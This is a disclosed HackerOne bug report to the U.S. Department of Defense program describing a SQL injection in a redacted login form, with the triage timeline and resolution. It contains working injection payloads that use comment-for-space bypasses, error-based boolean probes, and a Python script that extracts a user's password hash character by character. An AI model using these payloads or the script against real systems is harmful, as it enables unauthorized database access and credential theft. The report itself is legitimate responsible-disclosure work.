---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2020-09-29
submitted: 2020-09-14T21:00:44.360Z
bounty_usd: null
votes: 10
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "erbbysam"
source: "https://hackerone.com/reports/982202"
title: "SQLi in login form of █████"
---
# SQLi in login form of █████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 10 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-09-29

- Report: [https://hackerone.com/reports/982202](https://hackerone.com/reports/982202)
- CWE: SQL Injection
- Submitted: 2020-09-14T21:00:44.360Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary
The following is vulnerable to a sqli, due to a limited char set this is t██████████y to demonstrate and not picked up by sqlmap.

```
POST /██████████.asp HTTP/█████.████
Host: ███████
```

## Description
```
POST /██████.asp HTTP/████.███
Host: █████
Connection: close
Content-Length: 45
Cache-Control: max-age=0
Upgr███████e-Insecure-Requests: ███
Origin: https://████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X █████████0_████5_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?████████
Sec-Fetch-Dest: document
Referer: https://████████/wireless/index.asp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: █████████████████

usr='/**/or/**/lastName!='&pwd=██████████
```

returns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with `/**/`.

To summarize: 
`usr='/**/or/**/lastName!='&pwd=████████` -> 302
`usr='/**/or/**/abc!='&pwd=███` -> 500

case error g██████████get (which could be used to exfil data):
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>███0000/**/THEN/**/'a'/**/ELSE/**/███/**/END)/**/and/**/usr!='&pwd=████` -> 302
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)<██████0000)/**/THEN/**/'a'/**/ELSE/**/████████/**/END)/**/and/**/usr!='&pwd=████████` -> 500

Using this, we can prove that there are 26 user accounts:
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/███████/**/END)/**/and/**/usr!='&pwd=████████` -> 302
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/██████████/**/END)/**/and/**/usr!='&pwd=██████` -> 500

I have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.

**if you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission**

## Impact

SQLi, likely escalation to full service compromise

## Timeline

- **Report Filed**
- **2020-09-14** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request ███████ditional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **2020-09-15** @erbbysam: This is the script I ended up using for gathering data from this sqli as sqlmap did not work (this is configured to grab the user `████`'s password hash):
```
import requests

he██████ers = {'Content-Type': 'application/x-www-form-urlencoded'}
field = 'pwd'
id='██████6'
prefix = ""

while True:

    hit = False
    for i in range(48,90):
        dataInput="usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/qqqq/**/FROM/**/accounts/**/WHERE/**/id="+id+")='zzzz')/**/THEN/**/'a'/**/ELSE/**/██████/**/END)/**/and/**/usr!='&pwd=█████"
        dataInput = dataInput.replace('qqqq','substring('+field+',███,'+str(len(prefix)+█████)+')')
        dataInput = dataInput.replace('zzzz',prefix+chr(i))
        r = requests.post('https://█████/███.asp', data=dataInput, verify=False, allow_redirects=False, he████████ers=he██████ers)
        if r.status_code == 500:
            print("HIT "+chr(i))
            prefix = prefix + chr(i)
            hit = True
            break

    if hit == False:
        print("all done -- "+prefix)
        break
```

This eventually printed out `all done -- █████████` when I ran it previously.
- **Report Severity Updated**
- **Report Triaged**
- **2020-09-15** @agent-l8: @erbbysam great find, great follow through and fantastic write up!
- **2020-09-25** @erbbysam: It looks like this has been resolved as https://███████/ is no longer online.
Thanks,
Sam
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
